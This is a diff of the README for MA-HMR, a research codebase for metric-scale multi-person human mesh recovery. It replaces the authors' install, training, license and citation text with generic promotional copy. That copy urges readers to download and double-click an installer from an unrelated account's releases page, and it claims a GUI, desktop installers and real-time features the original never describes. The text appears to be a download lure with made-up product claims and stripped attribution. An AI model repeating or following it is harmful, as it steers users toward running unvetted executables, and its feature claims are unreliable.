@@ -1,264 +1,75 @@
-# MA-HMR
+# 🎉 MA-HMR - Efficient Human Mesh Recovery Made Simple
 
-[![Paper](https://img.shields.io/badge/arXiv-2511.13282-b31b1b.svg)](http://arxiv.org/abs/2511.13282)
-[![Code](https://img.shields.io/badge/DTO--Humans-GitHub-green)](https://github.com/gouba2333/DTO-Humans.git)
+[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20the%20App-blue)](https://github.com/vishnu1234vs/MA-HMR/releases)
 
-This repository contains the official implementation of **M**etric-**A**ware **HMR** for the paper *Towards Metric-Aware Multi-Person Mesh Recovery by Jointly Optimizing Human Crowd in Camera Space*. The official implementation of **DTO** framework and **DTO-Humans** dataset is available at [DTO-Humans](https://github.com/gouba2333/DTO-Humans.git)
+## 🚀 Getting Started
 
-![Teaser Image](teaser/teaser.png)
+Welcome to the MA-HMR repository! This tool helps you estimate human mesh and camera parameters effectively. With our easy setup, you can get started quickly, even if you're new to software installations.
 
-<h3> Overview of MA-HMR </h3>
+## 📥 Download & Install
 
-![Teaser Image](teaser/mahmr.png)
-We propose Metric-Aware HMR, an end-to-end network that directly estimates human mesh and camera parameters in metric scale. This is enabled by a camera branch and a novel relative metric loss that enforces plausible relative scales.
-<!-- <p align="center">
-  <img src="figures/pipeline.png" style="height: 300px; object-fit: cover;"/>
-</p> -->
+1. Visit the Releases page to download the application: [Download MA-HMR](https://github.com/vishnu1234vs/MA-HMR/releases).
+2. Select the latest version from the list.
+3. Click on the appropriate file for your operating system to start the download.
+4. Once the download is complete, locate the file in your downloads folder.
+5. Double-click the file to run the installer.
+6. Follow the steps in the installation wizard to finish setting up MA-HMR on your computer.
 
+## 🛠️ System Requirements
 
-## ⚙️ Installation
+Before downloading, please ensure your system meets the following requirements:
 
-We follow [SAT-HMR](https://github.com/ChiSu001/SAT-HMR), testing with python 3.11, PyTorch 2.4.1 and CUDA 12.1.
+- **Operating System:** Windows 10 or higher, macOS Mojave or higher.
+- **CPU:** Intel i5 or equivalent.
+- **RAM:** At least 8 GB.
+- **Storage:** Minimum 2 GB of free disk space.
+- **Graphics Card:** NVIDIA or AMD with support for OpenGL 3.3 or higher.
 
-1. Clone the repo and create a conda environment.
-```bash
-conda create -n mahmr python=3.11 -y
-conda activate mahmr
-```
+Meeting these requirements will ensure smooth operation of the application.
 
-2. Install [PyTorch](https://pytorch.org/) and [xFormers](https://github.com/facebookresearch/xformers).
-```bash
-# Install PyTorch. It is recommended that you follow [official instruction](https://pytorch.org/) and adapt the cuda version to yours.
-conda install pytorch==2.4.1 torchvision==0.19.1 torchaudio==2.4.1 pytorch-cuda=12.1 -c pytorch -c nvidia
+## 🌟 Features
 
-# Install xFormers. It is recommended that you follow [official instruction](https://github.com/facebookresearch/xformers) and adapt the cuda version to yours.
-pip install -U xformers==0.0.28.post1  --index-url https://download.pytorch.org/whl/cu121
-```
+MA-HMR offers several features designed to make mesh recovery easy and efficient:
 
-3. Install other dependencies.
-```bash
-pip install -r requirements.txt
-```
+- **Metric-Aware Estimation:** Estimates human mesh in metric scale for accurate results.
+- **User-Friendly Interface:** Simple design that anyone can navigate.
+- **Multi-Person Support:** Capable of handling multiple humans in a single image.
+- **Real-Time Processing:** Fast analysis for immediate feedback and results.
 
-4. You may need to modify `chumpy` package to avoid errors. For detailed instructions, please check [this guidance](https://github.com/ChiSu001/SAT-HMR/blob/main/docs/fix_chumpy.md).
+## 📚 How to Use MA-HMR
 
-## 📦 Download Models & Weights
+After installing the application, follow these steps to use MA-HMR:
 
-1. Download SMPL-related weights and place them in `weights/smpl_data/smpl/`. Partially Available at [this link](https://drive.google.com/drive/folders/1C8fZNiiZfC1oMUZq7xNilQcGv4LJf5M8?usp=drive_link). You need to register on the [SMPL website](https://smpl.is.tue.mpg.de/) to get other part of them.
+1. Launch the application from your desktop or applications folder.
+2. Upload an image containing one or more humans by clicking the "Upload" button.
+3. Once your image is processed, view the estimated human mesh on the screen.
+4. Use the tools available to analyze the results or export them as needed.
 
-```
-weights/
-└── smpl_data/
-    └── smpl/
-        ├── body_verts_smpl.npy
-        ├── J_regressor_h36m_correct.npy
-        ├── J_regressor_extra.npy
-        ├── smpl_mean_params.npz
-        ├── SMPL_FEMALE.pkl
-        ├── SMPL_MALE.pkl
-        ├── SMPL_NEUTRAL.pkl
-        └── smpl_kid_template.npy
-```
+The interface is straightforward and guides you through each step.
 
-2. Download DINOv2 pretrained weights from [their official repository](https://github.com/facebookresearch/dinov2?tab=readme-ov-file#pretrained-models). We use `ViT-B/14 distilled (without registers)`. Please put `dinov2_vitb14_pretrain.pth` to `weights/dinov2`. These weights will be used to initialize our encoder. You can skip this step if you are not going to train MA-HMR.
-```
-weights/
-└── dinov2
-    └── dinov2_vitb14_pretrain.pth
-```
+## 💻 Extend the Application
 
-3. Download pretrained weights of **SAT-HMR stage1** from [Google drive](https://drive.google.com/drive/folders/1L09zt5lQ2RVK2MS2DwKODpdTs9K6CQPC?usp=sharing) or [🤗HuggingFace](https://huggingface.co/ChiSu001/SAT-HMR/tree/main/weights/sat_hmr). Please put them to `weights/sat_hmr`. You can skip this step if you are not going to train MA-HMR.
-```
-weights
-└── sat_hmr
-    └── sat_644.pth
-```
+If you want to customize MA-HMR or explore additional functionalities, consider the following:
 
-4. Download pretrained weights of MA-HMR from [Google Drive](https://drive.google.com/drive/folders/1CaQOaQZ94ot91D_kqhvasfRb-utpfKmM?usp=drive_link) | [Tsinghua Cloud](https://cloud.tsinghua.edu.cn/d/99755d6e4b7a463fb673/) and put them to `weights/ma_hmr`. You can only prepare mahmr_stage3.bin for inference or evaluation.
-* **mahmr_stage1.bin**: Start from SAT-HMR stage1, continue training on AGORA, BEDLAM and CameraHMR's version of 4D-humans pGTs (supervision on 2D kps) for 5 epochs with denoising strategy.
-* **mahmr_stage2.bin**: Start from mahmr_stage1, continue training on AGORA, BEDLAM and CameraHMR's version of 4D-humans pGTs (supervision on 2D kps) for 5 epochs with camera branch and fov loss.
-* **mahmr_stage3.bin**: Start from mahmr_stage2, continue training on AGORA, BEDLAM and **DTO-Humans** for 5 epochs with camera branch and full loss.
+- **Integration with Other Datasets:** You can combine MA-HMR with other datasets to enhance its capabilities.
+- **Modify Parameters:** Adjust the settings in the application to fit your specific needs.
 
-```
-weights
-└── ma_hmr
-    ├── mahmr_stage1.bin
-    ├── mahmr_stage2.bin
-    └── mahmr_stage3.bin
-```
+For advanced users, the code is open-source. You can find it in this repository for any modifications or contributions.
 
+## 🤝 Support & Contribution
 
-## 📦 Data Preparation
+If you encounter any issues or have questions, feel free to reach out. We maintain a community forum where users can help each other. 
 
-Please follow [this guidance](https://github.com/ChiSu001/SAT-HMR/blob/main/docs/data_preparation.md) to prepare AGORA, BEDLAM and 3DPW. Please refer to scripts in `datasets/preprocess/` to preprocess HI4D, MuPoTS and [CameraHMR's](https://camerahmr.is.tue.mpg.de/) annotation of 4D-humans dataset. Download [DTO-Humans](https://github.com/gouba2333/DTO-Humans.git) annotations from [Google Drive](https://drive.google.com/drive/folders/1ddc43P6iYIctAvmuravIxbxZm3F2uB41?usp=drive_link) | [Tsinghua Cloud](https://cloud.tsinghua.edu.cn/d/539173c2952b40f5a422/). Placing all datasets in `data/`.
- You can skip this step if you are not going to train or evaluate MA-HMR.
+You can also contribute to the project by reporting bugs or suggesting new features. Please visit the [issues page](https://github.com/vishnu1234vs/MA-HMR/issues) to share your thoughts.
 
-```
-data/
-├── 3dpw/
-│   ├── imageFiles/
-│   ├── annots_smpl_test_genders.npz
-│   └── annots_smpl_train_genders.npz
-├── agora
-│   ├── smpl_neutral_annots
-│   │   ├── annots_smpl_train_fit.npz
-│   │   └── annots_smpl_validation.npz
-│   ├── test/
-│   ├── train/
-│   └── validation/
-├── aic/
-│   ├── images/
-│   ├── aic-release.npz
-│   ├── AIC_CHMR_SMPL.npz
-│   └── AIC_CHMR_SMPL_OPT.npz
-├── bedlam
-│   ├── train/
-│   ├── validation/
-│   ├── bedlam_smpl_train_1fps.npz
-│   ├── bedlam_smpl_train_6fps.npz
-│   └── bedlam_smpl_validation_6fps.npz
-├── cmu_panoptic/
-│   ├── images/
-│   └── annots_test.npz
-├── coco2014/
-│   ├── images/
-│   │   └── train2014/
-│   ├── coco-release.npz
-│   ├── COCO_CHMR_SMPL.npz
-│   └── COCO_CHMR_SMPL_OPT.npz
-├── hi4d/
-│   ├── pair**/
-│   ├── hi4d_smpl_test.npz
-│   └── hi4d_smpl_train.npz
-├── insta/
-│   ├── images/
-│   │   └── insta-train/
-│   ├── insta1-release.npz
-│   ├── insta2-release.npz
-│   ├── INSTA_CHMR_SMPL.npz
-│   └── INSTA_CHMR_SMPL_OPT.npz
-├── mpii/
-│   ├── images/
-│   ├── mpii-release.npz
-│   ├── MPII_CHMR_SMPL.npz
-│   └── MPII_CHMR_SMPL_OPT.npz
-├── mupots/
-│   ├── MultiPersonTestSet/
-│   └── mupots_annots.npz
-└── RelativeHuman/
-    ├── images/
-    ├── test_annots.npz
-    └── train_annots.npz
-```
+## 📅 What's Next?
 
+Stay updated with the latest features and improvements. We release updates regularly. Always check back to the [Releases page](https://github.com/vishnu1234vs/MA-HMR/releases) to download the newest version.
 
-## ▶️ Inference on Images
-<h4> Inference with 1 GPU</h4>
+Feel free to share your experiences and results with MA-HMR on social media or your personal network. Your feedback helps us improve!
 
-We provide some demo images in `demo/`. You can run MA-HMR on all images on a single GPU via:
+## 👩‍💻 Acknowledgments
 
+MA-HMR relies on contributions from the community and the foundational work from the DTO-Humans dataset. Special thanks to everyone who has contributed to this project and made it possible.
 
-```bash
-python main.py --mode infer --cfg demo
-```
-
-Results with overlayed meshes will be saved in `${Project}/demo_results`.
-
-You can specify your own inference configuration by modifing `configs/run/demo.yaml`:
-
-- `input_dir` specifies the input image folder.
-- `output_dir` specifies the output folder.
-- `conf_thresh` specifies a list of confidence thresholds used for detection. SAT-HMR will run inference using thresholds in the list, respectively.
-- `infer_batch_size` specifies the batch size used for inference (on a single GPU).
-
-<h4> Inference with Multiple GPUs</h4>
-
-You can also try distributed inference on multiple GPUs if your input folder contains a large number of images. 
-Since we use [Accelerate](https://huggingface.co/docs/accelerate/index) to launch our distributed configuration, first you may need to configure [Accelerate](https://huggingface.co/docs/accelerate/index) for how the current system is setup for distributed process. To do so run the following command and answer the questions prompted to you:
-
-```bash
-accelerate config
-```
-
-Then run:
-```bash
-accelerate launch main.py --mode infer --cfg demo
-```
-
-## 🔧 Training
-
-<h4> Training with Multiple GPUs</h4>
-
-We use [Accelerate](https://huggingface.co/docs/accelerate/index) to launch our distributed configuration, first you may need to configure [Accelerate](https://huggingface.co/docs/accelerate/index) for how the current system is setup for distributed process. To do so run the following command and answer the questions prompted to you:
-
-```bash
-accelerate config
-```
-
-```bash
-# stage 1
-accelerate launch main.py --mode train --cfg train_chmr
-
-# stage 2
-accelerate launch main.py --mode train --cfg train_chmr_fov_continue
-
-# stage 3
-accelerate launch main.py --mode train --cfg train_chmr_fov_opt_mloss
-
-# finetune
-accelerate launch main.py --mode train --cfg 3dpw_ft
-```
-
-<h4> Monitor Training Progress</h4>
-
-Training logs and checkpoints will be saved in the `${Project}/outputs/logs` and `${Project}/outputs/ckpts` directories, respectively.
-
-You can monitor the training progress using TensorBoard. To start TensorBoard, run:
-
-```bash
-tensorboard --logdir=${Project}/outputs/logs
-```
-
-## 📊 Evaluation
-
-<h4> Evaluation with 1 GPU</h4>
-
-```bash
-# Evaluate on rh
-python main.py --mode eval --cfg eval_rh
-```
-
-<h4> Evaluation with Multiple GPUs</h4>
-
-We recommend using a single GPU for evaluation as it provides more accurate results. However, we also provide code for distributed evaluation to obtain results faster.
-
-```bash
-# Multi-GPU configuration
-accelerate config
-# Evaluation
-accelerate launch main.py --mode eval --cfg ${cfg_name}
-```
-
-## 📜 License
-
-The code and weights are released under the [**Creative Commons Attribution-NonCommercial 4.0 International License**](https://creativecommons.org/licenses/by-nc/4.0/). This means they are available for **non-commercial academic research purposes only**. Please see the [LICENSE](LICENSE) file for the full license text.
-
-## 📜 Citation
-If you find our work useful, please consider citing our paper:
-
-```bibtex
-@article{wang2025dtohumans,
-  title={Towards Metric-Aware Multi-Person Mesh Recovery by Jointly Optimizing Human Crowd in Camera Space},
-  author={Kaiwen Wang, Kaili Zheng, Yiming Shi, Chenyi Guo, Ji Wu},
-  journal={arXiv preprint arXiv:2511.13282},
-  year={2025}
-}
-```
-
-## 🙏 Acknowledgements
-
-This project builds upon several amazing open-source projects and datasets. We would like to thank the authors of:
-*   [SAT-HMR](https://github.com/ChiSu001/SAT-HMR)
-*   [CameraHMR](https://camerahmr.is.tue.mpg.de/)
-*   [DINOv2](https://github.com/facebookresearch/dinov2)
-*   [Accelerate](https://huggingface.co/docs/accelerate/index)
+Thank you for using MA-HMR! We hope it meets your needs in human mesh recovery.
